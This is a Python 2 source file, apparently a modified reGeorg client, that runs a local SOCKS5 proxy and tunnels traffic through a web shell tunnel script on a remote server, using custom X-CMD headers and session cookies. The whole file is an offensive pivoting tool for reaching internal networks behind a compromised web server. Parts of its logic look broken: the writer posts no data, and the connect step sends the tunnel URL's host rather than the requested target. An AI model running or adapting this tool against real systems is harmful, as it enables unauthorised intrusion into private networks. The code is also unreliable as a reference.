#!/usr/bin/env python
# -*- coding: utf-8 -*-

import logging
import argparse
from urlparse import urlparse
from socket import *
from threading import Thread
import time
import requests

# Constants
SOCKTIMEOUT = 5
RESENDTIMEOUT = 300
VER = "\x05"
METHOD = "\x00"
SUCCESS = "\x00"
SOCKFAIL = "\x01"
NETWORKFAIL = "\x02"
HOSTFAIL = "\x04"
REFUSED = "\x05"
TTLEXPIRED = "\x06"
UNSUPPORTCMD = "\x07"
ADDRTYPEUNSPPORT = "\x08"
UNASSIGNED = "\x09"

BASICCHECKSTRING = "Georg says, 'All seems fine'"

# Globals
READBUFSIZE = 1024

# Logging
RESET_SEQ = "\033[0m"
COLOR_SEQ = "\033[1;%dm"
BOLD_SEQ = "\033[1m"

BLACK, RED, GREEN, YELLOW, BLUE, MAGENTA, CYAN, WHITE = range(8)

LEVEL = {"INFO": logging.INFO, "DEBUG": logging.DEBUG, }

logLevel = "INFO"

COLORS = {
    'WARNING': YELLOW,
    'INFO': WHITE,
    'DEBUG': BLUE,
    'CRITICAL': YELLOW,
    'ERROR': RED,
    'RED': RED,
    'GREEN': GREEN,
    'YELLOW': YELLOW,
    'BLUE': BLUE,
    'MAGENTA': MAGENTA,
    'CYAN': CYAN,
    'WHITE': WHITE,
}

HEADER = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
}

TIMEOUT = (5, 5)


def formatter_message(message, use_color=True):
    if use_color:
        message = message.replace("$RESET", RESET_SEQ).replace("$BOLD", BOLD_SEQ)
    else:
        message = message.replace("$RESET", "").replace("$BOLD", "")
    return message


class ColoredFormatter(logging.Formatter):
    def __init__(self, msg, use_color=True):
        logging.Formatter.__init__(self, msg)
        self.use_color = use_color

    def format(self, record):
        levelname = record.levelname
        if self.use_color and levelname in COLORS:
            levelname_color = COLOR_SEQ % (30 + COLORS[levelname]) + levelname + RESET_SEQ
            record.levelname = levelname_color
        return logging.Formatter.format(self, record)


class ColoredLogger(logging.Logger):

    def __init__(self, name):
        FORMAT = "[$BOLD%(levelname)-18s$RESET]  %(message)s"
        COLOR_FORMAT = formatter_message(FORMAT, True)
        logging.Logger.__init__(self, name, logLevel)
        if (name == "transfer"):
            COLOR_FORMAT = "\x1b[80D\x1b[1A\x1b[K%s" % COLOR_FORMAT
        color_formatter = ColoredFormatter(COLOR_FORMAT)

        console = logging.StreamHandler()
        console.setFormatter(color_formatter)

        self.addHandler(console)
        return


logging.setLoggerClass(ColoredLogger)
log = logging.getLogger(__name__)
transferLog = logging.getLogger("transfer")


class SocksCmdNotImplemented(Exception):
    pass


class SocksProtocolNotImplemented(Exception):
    pass


class RemoteConnectionFailed(Exception):
    pass


class session(Thread):
    def __init__(self, pSocket, connectString):
        Thread.__init__(self)
        self.pSocket = pSocket
        self.connectString = connectString
        o = urlparse(connectString)
        try:
            self.httpPort = o.port
        except:
            if o.scheme == "https":
                self.httpPort = 443
            else:
                self.httpPort = 80
        else:
            if not o.port:
                if o.scheme == "https":
                    self.httpPort = 443
                else:
                    self.httpPort = 80
        self.httpScheme = o.scheme
        self.httpHost = o.netloc.split(":")[0]
        self.httpPath = o.path
        self.cookie = None

    def parseSocks5(self, sock):
        log.debug("SocksVersion5 detected")
        nmethods, methods = (sock.recv(1), sock.recv(1))
        sock.sendall(VER + METHOD)
        ver = sock.recv(1)
        if ver == "\x02":  # this is a hack for proxychains
            ver, cmd, rsv, atyp = (sock.recv(1), sock.recv(1), sock.recv(1), sock.recv(1))
        else:
            cmd, rsv, atyp = (sock.recv(1), sock.recv(1), sock.recv(1))
        target = None
        targetPort = None
        if atyp == "\x01":  # IPv4
            # Reading 6 bytes for the IP and Port
            target = sock.recv(4)
            targetPort = sock.recv(2)
            target = ".".join([str(ord(i)) for i in target])
        elif atyp == "\x03":  # Hostname
            targetLen = ord(sock.recv(1))  # hostname length (1 byte)
            target = sock.recv(targetLen)
            targetPort = sock.recv(2)
            target = "".join([unichr(ord(i)) for i in target])
        elif atyp == "\x04":  # IPv6
            target = sock.recv(16)
            targetPort = sock.recv(2)
            tmp_addr = []
            for i in xrange(len(target) / 2):
                tmp_addr.append(unichr(ord(target[2 * i]) * 256 + ord(target[2 * i + 1])))
            target = ":".join(tmp_addr)
        targetPort = ord(targetPort[0]) * 256 + ord(targetPort[1])
        if cmd == "\x02":  # BIND
            raise SocksCmdNotImplemented("Socks5 - BIND not implemented")
        elif cmd == "\x03":  # UDP
            raise SocksCmdNotImplemented("Socks5 - UDP not implemented")
        elif cmd == "\x01":  # CONNECT
            serverIp = target
            try:
                serverIp = gethostbyname(target)
            except:
                log.error("oeps")
            serverIp = "".join([chr(int(i)) for i in serverIp.split(".")])
            # 获取cookie
            # self.cookie = self.setupRemoteSession(target, targetPort)
            self.cookie = self.new_setupRemoteSession()
            if self.cookie:
                sock.sendall(VER + SUCCESS + "\x00" + "\x01" + serverIp + chr(targetPort / 256) + chr(targetPort % 256))
                return True
            else:
                sock.sendall(VER + REFUSED + "\x00" + "\x01" + serverIp + chr(targetPort / 256) + chr(targetPort % 256))
                raise RemoteConnectionFailed("[%s:%d] Remote failed" % (target, targetPort))

        raise SocksCmdNotImplemented("Socks5 - Unknown CMD")

    # def parseSocks4(self, sock):
    #     log.debug("SocksVersion4 detected")
    #     cmd = sock.recv(1)
    #     if cmd == "\x01":  # Connect
    #         targetPort = sock.recv(2)
    #         targetPort = ord(targetPort[0]) * 256 + ord(targetPort[1])
    #         target = sock.recv(4)
    #         sock.recv(1)
    #         target = ".".join([str(ord(i)) for i in target])
    #         serverIp = target
    #         try:
    #             serverIp = gethostbyname(target)
    #         except:
    #             log.error("oeps")
    #         serverIp = "".join([chr(int(i)) for i in serverIp.split(".")])
    #         self.cookie = self.setupRemoteSession(target, targetPort)
    #         if self.cookie:
    #             sock.sendall(chr(0) + chr(90) + serverIp + chr(targetPort / 256) + chr(targetPort % 256))
    #             return True
    #         else:
    #             sock.sendall("\x00" + "\x91" + serverIp + chr(targetPort / 256) + chr(targetPort % 256))
    #             raise RemoteConnectionFailed("Remote connection failed")
    #     else:
    #         raise SocksProtocolNotImplemented("Socks4 - Command [%d] Not implemented" % ord(cmd))

    def handleSocks(self, sock):
        # This is where we setup the socks connection
        # 判断socket5还是socket4
        ver = sock.recv(1)
        if ver == "\x05":
            return self.parseSocks5(sock)
        # elif ver == "\x04":
        #     return self.parseSocks4(sock)

    def new_setupRemoteSession(self):
        """新的获取cookie方法"""
        HEADER.update({"X-CMD": "CONNECT", "X-TARGET": self.httpHost, "X-PORT": str(self.httpPort)})
        cookie = None
        # url = "{scheme}://{target}:{port}{path}".format(scheme=self.httpScheme, target=self.httpHost,
        #                                                 port=self.httpPort, path=self.httpPath)
        response = requests.post(url=self.connectString, headers=HEADER, data=None)
        if response:
            response_header = response.headers
            if response.status_code == 200 and response_header.get("X-STATUS") == "OK":
                cookie = response_header.get("Set-Cookie")
                log.info("[%s:%d] HTTP [200]: cookie [%s]" % (self.httpHost, self.httpPort, cookie))
            elif response_header.get("X-ERROR"):
                log.error(response_header.get("X-ERROR"))
        return cookie

    def closeRemoteSession(self):
        HEADER.update({"X-CMD": "DISCONNECT", "Cookie": self.cookie})
        response = requests.post(url=self.connectString, headers=HEADER, data=None)
        if response.status_code == 200:
            log.info("[%s:%d] Connection Terminated" % (self.httpHost, self.httpPort))

    def new_reader(self):
        """新的读取方法"""
        while True:
            if not self.pSocket:
                break
            HEADER.update({"X-CMD": "READ", "Cookie": self.cookie, "Connection": "Keep-Alive"})
            # 发送READ请求
            response = requests.post(url=self.connectString, headers=HEADER, data=None)
            if response:
                response_data = None
                if response.status_code == 200:
                    response_header = response.headers
                    status = response_header.get("x-status")
                    if status == "OK":
                        response_data = response.text
                        print(response_data)
                    else:
                        log.error("[%s:%d] HTTP [%d]: Status: [%s]: Message [%s] Shutting down" % (
                        self.httpHost, self.httpPort, response.status_code, status, response_header.get("X-ERROR")))
                else:
                    log.error("[%s:%d] HTTP [%d]: Shutting down" % (self.httpHost, self.httpPort, response.status_code))
                if response_data is None:
                    break
                # 等待服务器返回数据
                if len(response_data) == 0:
                    time.sleep(0.1)
                    continue
                transferLog.info("[%s:%d] <<<< [%d]" % (self.httpHost, self.httpPort, len(response_data)))
                self.pSocket.send(response_data)
        # 关闭连接
        self.closeRemoteSession()
        log.debug("[%s:%d] Closing localsocket" % (self.httpHost, self.httpPort))
        try:
            self.pSocket.close()
        except:
            log.debug("[%s:%d] Localsocket already closed" % (self.httpHost, self.httpPort))

    def new_writer(self):
        global READBUFSIZE
        while True:
            self.pSocket.settimeout(1)
            recv_data = self.pSocket.recv(READBUFSIZE)
            if not recv_data:
                break
            HEADER.update({"X-CMD": "FORWARD", "Cookie": self.cookie, "Content-Type": "application/octet-stream",
                           "Connection": "Keep-Alive"})
            response = requests.post(self.connectString, headers=HEADER, data=None)
            if response:
                response_header = response.headers
                if response.status_code == 200 and response_header.get("x-status") == "OK":
                    if response_header.get("set-cookie"):
                        self.cookie = response_header.get("set-cookie")
                else:
                    log.error("[%s:%d] HTTP [%d]: Status: [%s]: Message [%s] Shutting down" % (
                    self.httpHost, self.httpPort, response.status_code, response_header.get("x-status"),
                    response_header.get("x-error")))
                    break
            else:
                log.error("[%s:%d] HTTP [%d]: Shutting down" % (self.httpHost, self.httpPort, response.status_code))
                break
            transferLog.info("[%s:%d] >>>> [%d]" % (self.httpHost, self.httpPort, len(recv_data)))
        self.closeRemoteSession()
        log.debug("Closing localsocket")
        try:
            self.pSocket.close()
        except:
            log.debug("Localsocket already closed")

    def run(self):
        try:
            # 判断Socks5还是Socks4
            if self.handleSocks(self.pSocket):
                r = Thread(target=self.new_reader, args=())
                w = Thread(target=self.new_writer, args=())
                r.start()
                log.debug("Staring reader")
                w.start()
                log.debug("Staring writer")
                r.join()
                w.join()
        except SocksCmdNotImplemented, si:
            log.error(si.message)
            self.pSocket.close()
        except SocksProtocolNotImplemented, spi:
            log.error(spi.message)
            self.pSocket.close()
        except Exception, e:
            log.error(e.message)
            self.closeRemoteSession()
            self.pSocket.close()


def new_askgeorg(url):
    """新的检测reg连接方法"""
    response = requests.get(url=url, headers=HEADER, timeout=TIMEOUT)
    if response:
        text = response.text.strip()
        if response.status_code == 200 and text == "Georg says, 'All seems fine'":
            log.info(text)
            return True
    else:
        return False


if __name__ == '__main__':
    log.setLevel(logging.DEBUG)
    parser = argparse.ArgumentParser(description='Socks server for reGeorg HTTP(s) tunneller')
    parser.add_argument("-l", "--listen-on", metavar="", help="The default listening address", default="127.0.0.1")
    parser.add_argument("-p", "--listen-port", metavar="", help="The default listening port", type=int, default="8888")
    parser.add_argument("-r", "--read-buff", metavar="", help="Local read buffer, max data to be sent per POST",
                        type=int, default="1024")
    parser.add_argument("-u", "--url", metavar="", required=True, help="The url containing the tunnel script")
    parser.add_argument("-v", "--verbose", metavar="", help="Verbose output[INFO|DEBUG]", default="INFO")
    args = parser.parse_args()
    if (args.verbose in LEVEL):
        log.setLevel(LEVEL[args.verbose])
        log.info("Log Level set to [%s]" % args.verbose)

    log.info("Starting socks server [%s:%d], tunnel at [%s]" % (args.listen_on, args.listen_port, args.url))
    log.info("Checking if Georg is ready")
    # 查看shell连通性
    if not new_askgeorg(url=args.url):
        # if not askGeorg(args.url):
        log.info("Georg is not ready, please check url")
        exit()
    READBUFSIZE = args.read_buff
    # 创建socket
    servSock = socket(AF_INET, SOCK_STREAM)
    servSock.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
    servSock.bind((args.listen_on, args.listen_port))
    servSock.listen(1000)
    while True:
        try:
            sock, addr_info = servSock.accept()
            sock.settimeout(SOCKTIMEOUT)
            log.debug("Incomming connection")
            # 发起传输数据请求
            session(sock, args.url).start()
        except KeyboardInterrupt, ex:
            break
        except Exception, e:
            log.error(e)
    servSock.close()
